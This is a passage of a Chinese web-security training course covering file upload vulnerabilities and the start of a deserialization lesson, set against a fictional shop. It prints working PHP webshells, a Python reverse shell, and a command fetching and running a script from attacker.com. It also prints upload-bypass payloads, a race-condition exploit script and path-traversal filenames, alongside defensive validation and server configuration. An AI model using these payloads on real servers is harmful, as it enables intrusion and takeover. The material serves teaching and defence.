Webshell</h3>\n\n<p>攻击者的第一步是尝试上传一个 Webshell——一个可以在服务器上执行命令的脚本文件。以 PHP 为例：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-html\">&lt;!-- 攻击者构造的恶意上传请求 --&gt;\n&lt;!-- 将 PHP 代码伪装成图片上传 --&gt;\n\n# 使用 curl 绕过前端限制直接上传\ncurl -X POST https://cybershop.com/api/upload-avatar \\\n  -F \"avatar=@shell.php;type=image/jpeg\"\n\n# shell.php 的内容：\n&lt;?php\n// 简单的 Webshell\nif (isset($_GET['cmd'])) {\n    $output = shell_exec($_GET['cmd']);\n    echo \"&lt;pre&gt;$output&lt;/pre&gt;\";\n}\n\n// 更高级的 Webshell 可能包含：\n// - 文件管理功能\n// - 数据库连接\n// - 反向 Shell\n// - 权限提升\n?&gt;</code></pre></div>\n\n<p>如果服务器没有验证文件扩展名，这个 PHP 文件会被保存到 Web 目录中。攻击者随后可以访问：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 访问上传的 Webshell 执行命令\ncurl \"https://cybershop.com/uploads/shell.php?cmd=id\"\n# 输出：uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\ncurl \"https://cybershop.com/uploads/shell.php?cmd=cat+/etc/passwd\"\n# 输出：root:x:0:0:root:/root:/bin/bash\n#        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n#        ...\n\ncurl \"https://cybershop.com/uploads/shell.php?cmd=uname+-a\"\n# 输出：Linux cybershop-server 5.15.0-91-generic #101-Ubuntu SMP ...\n\n# 甚至可以下载反向 Shell 获取交互式终端\ncurl \"https://cybershop.com/uploads/shell.php?cmd=wget+http://attacker.com/reverse.sh+-O+/tmp/r.sh;bash+/tmp/r.sh\"</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>绕过技术：攻击者的武器库</h3>\n\n<p>现实中的应用程序通常会实施一些基本的文件类型验证。但攻击者有多种技术可以绕过这些验证：</p>\n\n<h4>1. 扩展名操纵</h4>\n\n<p>不同的服务器和配置对文件扩展名的解析方式不同。攻击者可以利用这些差异：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 大小写混淆（某些系统区分大小写）\nshell.PHP\nshell.PhP\nshell.pHp\n\n# 双扩展名（某些服务器按最后一个扩展名解析）\nshell.php.jpg\nshell.jpg.php\n\n# 特殊扩展名（Apache 配置不当可能解析）\nshell.php5\nshell.phtml\nshell.php4\n\n# Null 字节截断（旧版本 PHP/Java 的漏洞）\nshell.php%00.jpg\nshell.php\\x00.jpg\n\n# 空格和点号（Windows 系统特性）\nshell.php .\nshell.php.\nshell.php::$DATA</code></pre></div>\n\n<h4>2. MIME 类型欺骗</h4>\n\n<p>许多应用程序通过检查 HTTP 请求中的 <code>Content-Type</code> 头来验证文件类型。但攻击者可以轻松伪造这个值：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 服务器端验证（容易被绕过）\ndef validate_file(file):\n    allowed_types = ['image/jpeg', 'image/png', 'image/gif']\n    \n    if file.content_type not in allowed_types:\n        return False  # 拒绝上传\n    \n    return True\n\n# 攻击者构造的请求（伪造 Content-Type）\ncurl -X POST https://cybershop.com/api/upload-avatar \\\n  -F \"avatar=@shell.php;type=image/jpeg\"\n  # Content-Type 被设置为 image/jpeg，但文件内容是 PHP 代码</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">警告</div><p>永远不要仅依赖 <code>Content-Type</code> 头来验证文件类型！这个值由客户端提供，完全可以被伪造。应该结合文件扩展名、文件内容（Magic Bytes）和实际处理结果进行多重验证。</p></div>\n\n<h4>3. 文件头注入（Magic Bytes 伪造）</h4>\n\n<p>更严格的验证会检查文件的\"魔术字节\"（Magic Bytes）——文件开头的特定字节序列，用于标识文件类型：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 常见图片格式的魔术字节\nJPEG: FF D8 FF E0\nPNG:  89 50 4E 47 0D 0A 1A 0A\nGIF:  47 49 46 38 39 61 (GIF89a)\n\n# 攻击者可以在 PHP 代码前添加 JPEG 头，使其看起来像图片\n# shell_with_header.php 的内容：\n\n# 二进制形式：\nFF D8 FF E0 00 10 4A 46 49 46 00 01 ... [JPEG 头]\n3C 3F 70 68 70 20 73 79 73 74 65 6D 28 24 5F 47 45 54 5B 27 63 6D 64 27 5D 29 3B 20 3F 3E\n# &lt;?php system($_GET['cmd']); ?&gt;\n\n# 使用 Python 创建伪装文件\npython3 -c \"\nimport struct\n\n# JPEG 文件头\njpeg_header = bytes([\n    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,\n    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,\n    0x00, 0x01, 0x00, 0x00\n])\n\n# PHP 代码\nphp_code = b'&lt;?php system(\\$_GET[\\\"cmd\\\"]); ?&gt;'\n\n# 组合成伪装文件\nwith open('fake_image.php', 'wb') as f:\n    f.write(jpeg_header + php_code)\n\"</code></pre></div>\n\n<h4>4. 图片二次渲染绕过</h4>\n\n<p>某些应用程序会对上传的图片进行重新处理（如调整大小、压缩），这通常会破坏注入的代码。但攻击者可以寻找不会被修改的数据区域：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 在图片的 EXIF 数据或注释区域注入代码\n# 这些区域在图片处理时通常会被保留\n\n# 使用 exiftool 在 JPEG 的 Comment 字段注入 PHP 代码\nexiftool -Comment='&lt;?php system($_GET[\"cmd\"]); ?&gt;' normal.jpg\n\n# 生成的文件仍然是有效的 JPEG，但包含了 PHP 代码\n# 如果服务器在特定条件下解析这个文件为 PHP，代码就会被执行\n\n# 在 GIF 的注释块中注入\n# GIF89a 格式的注释块以 0x21 0xFE 开头\npython3 -c \"\ncomment = b'&lt;?php system(\\$_GET[\\\"cmd\\\"]); ?&gt;'\ncomment_block = b'\\x21\\xFE' + bytes([len(comment)]) + comment + b'\\x00'\n\nwith open('normal.gif', 'rb') as f:\n    data = f.read()\n\n# 在 GIF 数据中插入注释块\nwith open('malicious.gif', 'wb') as f:\n    f.write(data[:6] + comment_block + data[6:])\n\"</code></pre></div>\n\n<h4>5. 利用服务器解析漏洞</h4>\n\n<p>某些 Web 服务器存在解析漏洞，会导致非 .php 文件被当作 PHP 执行：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Apache 多后缀解析漏洞\n# 如果配置不当，Apache 可能会按最后一个可识别的后缀解析文件\nshell.php.jpg  # 可能被解析为 PHP\n\n# Nginx 解析漏洞（CVE-2013-4547）\n# 文件名包含特殊字符可能导致解析错误\nshell.jpg\\x00.php  # 可能被解析为 PHP\n\n# IIS 6.0 解析漏洞\nshell.asp;.jpg  # 分号后的内容被忽略，文件被解析为 ASP\nshell.asp/asdf.jpg  # 目录名包含 .asp，目录下所有文件被解析为 ASP</code></pre></div>\n\n<h4>6. .htaccess 文件上传攻击</h4>\n\n<p>如果 Apache 服务器配置允许使用 <code>.htaccess</code> 文件覆盖目录设置，攻击者可以上传一个恶意的 <code>.htaccess</code> 文件来改变服务器的行为：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 攻击步骤：\n# 第一步：上传恶意的 .htaccess 文件\n# .htaccess 文件内容：\nAddType application/x-httpd-php .jpg\n\n# 这条指令告诉 Apache：将 .jpg 文件当作 PHP 来执行\n\n# 第二步：上传一个包含 PHP 代码的 .jpg 文件\n# evil.jpg 内容：&lt;?php system($_GET['cmd']); ?&gt;\n\n# 第三步：访问 evil.jpg，服务器会将其作为 PHP 执行！\ncurl \"https://cybershop.com/uploads/evil.jpg?cmd=id\"\n# 输出：uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n# 其他 .htaccess 攻击变体：\n# 关闭安全限制\nphp_flag engine on\nphp_value auto_prepend_file .htaccess\n\n# 将特定文件映射为 PHP\nSetHandler application/x-httpd-php .png\nAddHandler cgi-script .jpg</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">警告</div><p>.htaccess 攻击之所以危险，是因为它改变了整个目录的解析规则。一旦 .htaccess 文件被上传，攻击者可以随后上传任何扩展名的文件，服务器都会将其作为脚本执行。防御的关键是禁止上传 .htaccess 文件，并在 Apache 全局配置中设置 <code>AllowOverride None</code>。</p></div>\n\n<h4>7. 多语言文件（Polyglot）攻击</h4>\n\n<p>Polyglot 文件是一种同时是两种或多种有效文件格式的文件。攻击者可以创建一个既是有效 JPEG 图片又是有效 PHP 脚本的文件：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 创建一个 JPEG + PHP Polyglot 文件\n\n# 方法1：在 JPEG 的 Comment 区域嵌入 PHP 代码\n# JPEG 格式允许在文件头中包含注释段（0xFF 0xFE）\n\nimport struct\n\n# 标准 JPEG 文件头（SOI 标记）\nsoi = b'\\xFF\\xD8'\n\n# JPEG Comment 段（包含 PHP 代码）\nphp_code = b'&lt;?php system($_GET[\"cmd\"]); ?&gt;'\ncomment_length = len(php_code) + 2\ncomment_segment = b'\\xFF\\xFE' + struct.pack('&gt;H', comment_length) + php_code\n\n# JPEG Application 段（JFIF 标识）\njfif_segment = bytes([\n    0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46,\n    0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01,\n    0x00, 0x00\n])\n\n# 读取一个正常的 JPEG 文件的剩余像素数据\nwith open('normal.jpg', 'rb') as f:\n    f.read(2)  # 跳过原始 SOI\n    image_data = f.read()\n\n# 组合成 Polyglot 文件\nwith open('polyglot.jpg', 'wb') as f:\n    f.write(soi + jfif_segment + comment_segment + image_data)\n\n# 生成的文件：\n# - 可以被图片查看器正常打开（它是有效的 JPEG）\n# - 可以被文件验证工具识别为图片\n# - 如果服务器将其作为 PHP 解析，PHP 代码会被执行\n# - PHP 解释器会忽略 JPEG 二进制数据（作为语法错误处理）\n\n# 方法2：利用 GIF89a 格式的特性\n# GIF 文件以 \"GIF89a\" 开头，这恰好也是有效的文本\n# 可以构造一个文件：\n# GIF89a/* 开头既是 GIF 头也是 PHP 注释\n# &lt;?php system($_GET['cmd']); ?&gt;\n# */ 结束 PHP 注释\ngif_polyglot = b'GIF89a/*&lt;?php system($_GET[\"cmd\"]); ?&gt;*/'</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>攻击影响：从代码执行到完全控制</h3>\n\n<p>成功的文件上传漏洞攻击可以导致：</p>\n\n<h4>远程代码执行（RCE）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 攻击者上传的 Webshell 可以执行任意系统命令\n# 以下是一个功能完整的 Webshell 示例（仅用于教育目的）\n\n&lt;?php\n// 执行系统命令\nif (isset($_POST['cmd'])) {\n    $cmd = $_POST['cmd'];\n    $output = shell_exec($cmd);\n    echo \"&lt;pre&gt;\" . htmlspecialchars($output) . \"&lt;/pre&gt;\";\n}\n\n// 文件管理\nif (isset($_POST['action']) && $_POST['action'] == 'list') {\n    $dir = $_POST['dir'] ?? '.';\n    $files = scandir($dir);\n    foreach ($files as $file) {\n        echo $file . \"&lt;br&gt;\";\n    }\n}\n\n// 文件下载\nif (isset($_POST['action']) && $_POST['action'] == 'download') {\n    $file = $_POST['file'];\n    if (file_exists($file)) {\n        header('Content-Type: application/octet-stream');\n        header('Content-Disposition: attachment; filename=\"' . basename($file) . '\"');\n        readfile($file);\n        exit;\n    }\n}\n\n// 反向 Shell\nif (isset($_POST['action']) && $_POST['action'] == 'reverse') {\n    $ip = $_POST['ip'];\n    $port = $_POST['port'];\n    // 使用 Python 建立反向连接\n    $cmd = \"python -c 'import socket,subprocess,os;\";\n    $cmd .= \"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\";\n    $cmd .= \"s.connect((\\\"$ip\\\",$port));\";\n    $cmd .= \"os.dup2(s.fileno(),0);\";\n    $cmd .= \"os.dup2(s.fileno(),1);\";\n    $cmd .= \"os.dup2(s.fileno(),2);\";\n    $cmd .= \"subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\";\n    shell_exec($cmd);\n}\n?&gt;</code></pre></div>\n\n<h4>持久化后门</h4>\n\n<p>攻击者可以上传多个后门文件，确保即使一个被发现删除，仍有其他途径访问系统：</p>\n\n<ul>\n  <li>在不同目录上传多个 Webshell</li>\n  <li>使用混淆技术隐藏代码（如 base64 编码、eval 函数）</li>\n  <li>修改系统文件植入后门</li>\n  <li>创建系统用户或 SSH 密钥</li>\n</ul>\n\n<h4>横向移动</h4>\n\n<p>一旦攻击者获得服务器的控制权，他们可以：</p>\n\n<ul>\n  <li>利用服务器访问内网其他系统</li>\n  <li>窃取数据库中的敏感信息</li>\n  <li>利用服务器作为跳板攻击其他目标</li>\n  <li>安装勒索软件或挖矿程序</li>\n</ul>\n\n<h4>路径遍历攻击（Path Traversal）</h4>\n\n<p>如果应用程序直接使用用户上传的文件名来构建存储路径，攻击者可以利用目录遍历字符将文件写入任意位置：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 路径遍历攻击示例\n\n# 正常上传：\n# 文件名：avatar.jpg\n# 存储路径：/var/www/uploads/avatar.jpg\n\n# 恶意上传（利用 ../ 遍历目录）：\n# 文件名：../../../etc/cron.d/evil\n# 存储路径：/var/www/uploads/../../../etc/cron.d/evil -> /etc/cron.d/evil\n# 这会覆盖系统的定时任务配置！\n\n# 文件名：../../webapps/ROOT/shell.jsp\n# 存储路径：/var/www/uploads/../../webapps/ROOT/shell.jsp -> /var/webapps/ROOT/shell.jsp\n# 将 Webshell 部署到 Web 根目录\n\n# 不同操作系统的遍历字符\n# Linux/Unix: ../  或  ..\\\n# Windows:    ..\\  或  ../\n# URL 编码:   %2e%2e%2f  或  %2e%2e%5c\n# 双重编码:   %252e%252e%252f\n\n# 更危险的变体：写入 SSH 公钥\n# 文件名：../../../root/.ssh/authorized_keys\n# 文件内容：ssh-rsa AAAAB3... attacker@evil\n# 攻击者可以直接通过 SSH 登录服务器</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">警告</div><p>路径遍历攻击的后果可能非常严重。攻击者不仅可以覆盖系统文件，还可以将恶意脚本写入 Web 目录、修改配置文件、甚至写入定时任务实现持久化控制。使用 <code>secure_filename()</code> 或自行实现文件名清理是防御路径遍历的基本手段。</p></div>\n\n<h4>竞争条件攻击（Race Condition）</h4>\n\n<p>在某些场景下，即使服务器在保存文件后会验证文件类型并删除非法文件，攻击者仍可利用<strong>竞争条件</strong>在文件被删除前执行它：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 存在竞争条件的服务器代码\n@app.route('/api/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    \n    # 第一步：先保存文件（此时文件已可被访问）\n    temp_path = os.path.join(UPLOAD_FOLDER, file.filename)\n    file.save(temp_path)\n    \n    # 第二步：验证文件类型（需要时间）\n    if not is_valid_image(temp_path):\n        os.remove(temp_path)\n        return \"文件类型不合法\", 400\n    \n    return \"上传成功\"\n\n# 攻击者的策略：\n# 同时发送大量上传请求和访问请求\n# 在文件被验证和删除之前的极短窗口内，访问并执行 Webshell\n\n# 攻击脚本（使用多线程并发）\nimport requests\nimport threading\n\ndef upload_shell():\n    for i in range(1000):\n        files = {'file': ('shell.php', '&lt;?php system($_GET[\"c\"]); ?&gt;')}\n        requests.post('https://target.com/api/upload', files=files)\n\ndef access_shell():\n    for i in range(1000):\n        r = requests.get('https://target.com/uploads/shell.php?c=id')\n        if r.status_code == 200 and 'uid=' in r.text:\n            print(f\"成功执行！响应: {r.text}\")\n            return\n\n# 同时运行上传和访问线程\nt1 = threading.Thread(target=upload_shell)\nt2 = threading.Thread(target=access_shell)\nt1.start()\nt2.start()</code></pre></div>\n\n<h3>真实案例：文件上传漏洞的影响</h3>\n\n<p>文件上传漏洞在历史上造成了许多严重的安全事件：</p>\n\n<ul>\n  <li><strong>Equifax 数据泄露（2017）</strong>：攻击者利用 Apache Struts 的文件上传漏洞，窃取了 1.47 亿用户的个人信息</li>\n  <li><strong>TalkTalk 数据泄露（2015）</strong>：攻击者通过文件上传功能获取数据库访问权限，泄露了 15.7 万客户信息</li>\n  <li><strong>多个 CMS 系统</strong>：WordPress、Joomla、Drupal 等 CMS 的插件经常被发现存在文件上传漏洞</li>\n</ul>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>文件上传漏洞的危害程度取决于服务器的配置。如果上传目录禁止执行脚本（如 Apache 中设置 <code>Options -ExecCGI</code> 和 <code>RemoveHandler</code>），即使攻击者成功上传了 Webshell，也无法执行代码。这是纵深防御策略的重要一环。</p></div>\n\n<h3>防御策略：构建安全的文件上传功能</h3>\n\n<p>防御文件上传漏洞需要多层防护机制：</p>\n\n<h4>1. 白名单扩展名验证</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import os\nimport re\nfrom werkzeug.utils import secure_filename\n\n# 严格的白名单\nALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}\n\ndef allowed_file(filename):\n    \"\"\"验证文件扩展名是否在白名单中\"\"\"\n    if not filename or '.' not in filename:\n        return False\n    \n    # 获取最后一个扩展名\n    ext = filename.rsplit('.', 1)[1].lower()\n    \n    return ext in ALLOWED_EXTENSIONS\n\n# 使用示例\n@app.route('/api/upload-avatar', methods=['POST'])\ndef upload_avatar():\n    file = request.files['avatar']\n    \n    if not file or file.filename == '':\n        return \"未选择文件\", 400\n    \n    # 验证扩展名\n    if not allowed_file(file.filename):\n        return \"不支持的文件类型\", 400\n    \n    # 使用 secure_filename 清理文件名\n    filename = secure_filename(file.filename)\n    \n    # ... 继续处理上传 ...</code></pre></div>\n\n<h4>2. 文件内容验证</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import imghdr\nimport magic  # python-magic 库\n\ndef validate_image_content(file_path):\n    \"\"\"验证文件内容是否为有效图片\"\"\"\n    \n    # 方法1：使用 imghdr 标准库\n    image_type = imghdr.what(file_path)\n    if image_type not in ['jpeg', 'png', 'gif']:\n        return False\n    \n    # 方法2：使用 python-magic 库（更准确）\n    mime = magic.Magic(mime=True)\n    file_mime = mime.from_file(file_path)\n    if file_mime not in ['image/jpeg', 'image/png', 'image/gif']:\n        return False\n    \n    # 方法3：尝试用 PIL 打开图片\n    try:\n        from PIL import Image\n        img = Image.open(file_path)\n        img.verify()  # 验证图片完整性\n    except Exception:\n        return False\n    \n    return True\n\n# 检查 Magic Bytes\ndef check_magic_bytes(file_path):\n    \"\"\"直接检查文件头的魔术字节\"\"\"\n    with open(file_path, 'rb') as f:\n        header = f.read(16)\n    \n    # JPEG\n    if header.startswith(b'\\xFF\\xD8\\xFF'):\n        return 'jpeg'\n    # PNG\n    elif header.startswith(b'\\x89PNG\\r\\n\\x1a\\n'):\n        return 'png'\n    # GIF\n    elif header.startswith(b'GIF87a') or header.startswith(b'GIF89a'):\n        return 'gif'\n    \n    return None</code></pre></div>\n\n<h4>3. 安全存储策略</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import uuid\nimport os\n\nUPLOAD_FOLDER = '/var/www/cybershop/uploads/'\nMAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB\n\ndef secure_upload(file):\n    \"\"\"安全的文件上传处理\"\"\"\n    \n    # 1. 检查文件大小\n    file.seek(0, os.SEEK_END)\n    size = file.tell()\n    file.seek(0)\n    \n    if size > MAX_FILE_SIZE:\n        raise ValueError(\"文件过大\")\n    \n    if size == 0:\n        raise ValueError(\"文件为空\")\n    \n    # 2. 生成随机文件名（避免路径遍历和文件名冲突）\n    ext = file.filename.rsplit('.', 1)[1].lower()\n    new_filename = f\"{uuid.uuid4().hex}.{ext}\"\n    \n    # 3. 确保上传目录存在且安全\n    os.makedirs(UPLOAD_FOLDER, exist_ok=True)\n    \n    # 4. 保存文件\n    filepath = os.path.join(UPLOAD_FOLDER, new_filename)\n    file.save(filepath)\n    \n    # 5. 二次验证文件内容\n    if not validate_image_content(filepath):\n        os.remove(filepath)\n        raise ValueError(\"文件内容验证失败\")\n    \n    return new_filename</code></pre></div>\n\n<h4>4. Web 服务器配置</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Apache 配置：禁止上传目录执行脚本\n&lt;Directory \"/var/www/cybershop/uploads/\"&gt;\n    # 禁止执行 CGI 脚本\n    Options -ExecCGI -Indexes\n    \n    # 移除所有脚本处理器\n    RemoveHandler .php .phtml .php3 .php4 .php5 .pht .phps .pl .py .jsp .asp .aspx .sh .cgi\n    \n    # 移除所有脚本类型\n    RemoveType .php .phtml .php3 .php4 .php5 .pht .phps .pl .py .jsp .asp .aspx .sh .cgi\n    \n    # 强制以纯文本方式显示\n    &lt;FilesMatch \"\\.(php|phtml|php3|php4|php5|pht|phps|pl|py|jsp|asp|aspx|sh|cgi)$\"&gt;\n        ForceType text/plain\n    &lt;/FilesMatch&gt;\n&lt;/Directory&gt;\n\n# Nginx 配置：禁止上传目录执行 PHP\nlocation /uploads/ {\n    # 禁止解析 PHP\n    location ~ \\.php$ {\n        deny all;\n    }\n    \n    # 只允许访问图片文件\n    location ~* \\.(jpg|jpeg|png|gif)$ {\n        # 允许访问\n    }\n    \n    # 拒绝其他所有请求\n    location / {\n        deny all;\n    }\n}\n\n# 更安全的做法：使用独立的域名或子域名提供上传文件访问\n# 如：static.cybershop.com/uploads/xxx.jpg\n# 该域名不配置任何脚本解析能力</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h4>5. 纵深防御清单</h4>\n\n<div class=\"callout success\"><div class=\"callout-title\">最佳实践</div><p>防御文件上传漏洞的完整策略：\n<ul>\n  <li><strong>白名单扩展名</strong>：只允许预定义的安全文件类型</li>\n  <li><strong>验证文件内容</strong>：使用 Magic Bytes、PIL 等多重验证</li>\n  <li><strong>重命名文件</strong>：使用随机 UUID，避免路径遍历</li>\n  <li><strong>限制文件大小</strong>：防止拒绝服务攻击</li>\n  <li><strong>存储在 Web 目录外</strong>：或配置服务器禁止执行脚本</li>\n  <li><strong>使用 CDN/对象存储</strong>：将文件存储在独立的服务（如 S3）</li>\n  <li><strong>杀毒扫描</strong>：使用 ClamAV 等工具扫描恶意软件</li>\n  <li><strong>图片重新编码</strong>：强制重新渲染图片，破坏注入代码</li>\n</ul></p></div>\n\n<h3>总结</h3>\n\n<p>文件上传漏洞是 Web 应用中最危险的漏洞之一，因为成功的攻击可以直接导致服务器被完全控制。防御的关键在于：</p>\n\n<ol>\n  <li><strong>永远不要信任用户输入</strong>：包括文件名、文件类型、文件内容</li>\n  <li><strong>多层验证</strong>：扩展名 + MIME 类型 + Magic Bytes + 内容处理</li>\n  <li><strong>安全存储</strong>：随机文件名、Web 目录外、禁止脚本执行</li>\n  <li><strong>最小权限</strong>：上传服务使用受限权限，无法执行危险操作</li>\n</ol>\n\n<p>记住：即使前端已经做了验证，服务器端也必须重新验证。前端验证只是为了提升用户体验，不能作为安全措施。</p>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF('ctf-019')\"><span class=\"arrow\">▶</span> CTF挑战: File Upload Bypass</button>";
+
+SECTION_CONTENT["web-06-01"] = "<!-- ============================================================= -->\n<!-- SECTION 1: 反序列化攻击 (contentKey: web-06-01)                -->\n<!-- ============================================================= -->\n\n<div class=\"section-transition\"><p>上一章我们学会了通过文件上传获取服务器控制权。但有时服务器并不直接接受文件上传，而是处理更复杂的数据格式。本节我们将探索一种更隐蔽的攻击方式——<strong>反序列化漏洞</strong>，它能让你在没有任何文件上传的情况下执行任意代码。</p></div>\n\n<h2>反序列化攻击</h2>\n<p><strong>主题：数据变形术——让服务器自己执行恶意代码</strong></p>\n\n<p>在现代 Web 应用中，数据经常需要在不同的系统、服务或存储介质之间传递。为了让复杂对象能够被存储和传输，开发者会使用<strong>序列化</strong>（Serialization）将对象转换为字节流或字符串，然后在接收端通过<strong>反序列化</strong>（Deserialization）将其还原为对象。这个过程看似无害，但如果攻击者能够控制被反序列化的数据，就能让服务器在还原对象的过程中执行任意代码——无需上传任何文件，也无需绕过任何文件上传防护。</p>\n\n<h3>什么是序列化与反序列化？</h3>\n\n<p>想象一下 CyberShop 电商平台的购物车系统。当用户将商品加入购物车后，服务器需要把购物车的状态保存下来（可能是存入数据库、写入 Session 或缓存到 Redis），以便用户下次访问时还能看到自己的购物车内容。</p>\n\n<p>这个保存和恢复的过程就是序列化和反序列化：</p>\n\n<ul>\n<li><strong>序列化（Serialization）</strong>：将内存中的对象（如购物车对象、用户对象）转换为可以存储或传输的格式（字符串、字节流）</li>\n<li><strong>反序列化（Deserialization）</strong>：将存储或传输的数据还原为内存中的对象</li>\n</ul>\n\n<p>不同编程语言有不同的序列化方式：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># Python 的序列化方式\nimport pickle, json\n\n# 使用 pickle（Python 特有）\nuser_data = {\"username\": \"alice\", \"role\": \"admin\", \"cart\": [\"item1\", \"item2\"]}\nserialized = pickle.dumps(user_data)       # 序列化为字节流\nrestored = pickle.loads(serialized)         # 反序列化还原对象\n\n# 使用 JSON（跨语言通用）\njson_str = json.dumps(user_data)            # 序列化为 JSON 字符串\nrestored = json.loads(json_str)             # 反序列化还原字典</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\">&lt;?php\n// PHP 的序列化方式\n$user = new stdClass();\n$user-&gt;username = \"alice\";\n$user-&gt;role = \"user\";\n\n$serialized = serialize($user);\n// 输出: O:8:\"stdClass\":2:{s:8:\"username\";s:5:\"alice\";s:4:\"role\";s:4:\"user\";}\n\n$restored = unserialize($serialized);  // 反序列化还原对象\n?&gt;</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-java\">// Java 的序列化方式\nUser user = new User(\"alice\", \"user\");\n// 序列化\nByteArrayOutputStream bos = new ByteArrayOutputStream();\nObjectOutputStream oos = new ObjectOutputStream(bos);\noos.writeObject(user);\nbyte[] serialized = bos.toByteArray();\n\n// 反序列化\nByteArrayInputStream bis = new ByteArrayInputStream(serialized);\nObjectInputStream ois = new ObjectInputStream(bis);\nUser restored = (User) ois.readObject();  // 这里可能触发漏洞！</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>序列化和反序列化本身是一种正常的数据处理方式，问题出在<strong>反序列化不可信的数据</strong>上。就像快递包裹本身没有危险，但如果有人在包裹里放了炸弹，拆包裹的过程就会引爆。反序列化漏洞就是攻击者精心构造了一个\"带炸弹的包裹\"。</p></div>\n\n<h3>PHP 反序列化漏洞</h3>\n\n<p>PHP 的 <code>unserialize()</code> 函数是最常见的反序列化漏洞入口。当它处理不可信的输入时，攻击者可以构造恶意的序列化字符串，利用 PHP 类中的<strong>魔术方法</strong>（Magic Methods）来执行任意代码。</p>\n\n<h4>PHP 魔术方法：反序列化的触发点</h4>\n\n<p>PHP 有一些特殊的\"魔术方法\"会在特定时刻自动调用：</p>\n\n<ul>\n<li><code>__construct()</code> — 对象创建时调用（反序列化时<strong>不</strong>会调用）</li>\n<li><code>__wakeup()</code> — 反序列化时自动调用</li>\n<li><code>__destruct()</code> — 对象销毁时自动调用</li>\n<li><code>__toString()</code> — 对象被当作字符串使用时调用</li>\n<li><code>__call()</code> — 调用不存在的方法时调用</li>\n</ul>\n\n<p>攻击者的目标就是找到一个链条（称为 <strong>POP Chain</strong>），将这些魔术方法串联起来，最终实现代码执行。</p>\n\n<h4>POP Chain 构造方法论</h4>\n\n<p>构造一条有效的 POP Chain 需要系统性的分析方法。以下是安全研究人员常用的思路：</p>\n\n<ol>\n<li><strong>寻找入口点（Source）</strong>：找到反序列化时会自动触发的魔术方法（<code>__wakeup()</code>、<code>__destruct()</code>）</li>\n<li><strong>寻找终点（Sink）</strong>：找到可以执行危险操作的函数（<code>system()</code>、<code>eval()</code>、<code>file_put_contents()</code>、<code>include()</code>）</li>\n<li><strong>构建链条</strong>：将入口和终点通过中间类的方法调用连接起来</li>\n</ol>\n\n<p>以一个更复杂的例子来说明。假设 CyberShop 的代码库中有以下三个类：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-php\">&lt;?php\nclass Logger {\n    private $logFile;\n    private $logData;\n\n    public function __construct($file, $data) {\n        $this-&gt;logFile = $file;\n        $this-&gt;logData = $data;\n    }\n\n    // 终点 Sink：对象销毁时写入日志\n    public function __destruct() {\n        file_put_contents($this-&gt;logFile, $this-&gt;logData);\n    }\n}\n\nclass UserInfo {\n    public $name;\n    public $profile;\n\n    // 中间环节：当对象被当作字符串使用时\n    public function __toString() {\n        return $this-&gt;profile-&gt;render($this-&gt;name);\n    }\n}\n\nclass Template {\n    public $template;\n    public $data;\n\n    // 入口点 Source：反序列化时触发\n    public function __wakeup() {\n        echo \"Loading template: \" . $this-&gt;data;\n        // 如果 $this-&gt;data 是一个 UserInfo 对象\n        // echo 会触发 UserInfo::__toString()\n    }\n\n    public function render($name) {\n        return str_replace(\"{{name}}\", $name, $this-&gt;template);\n    }\n}\n\n// === 攻击链构造 ===\n// Template::__wakeup()\n//   -&gt; echo $this-&gt;data 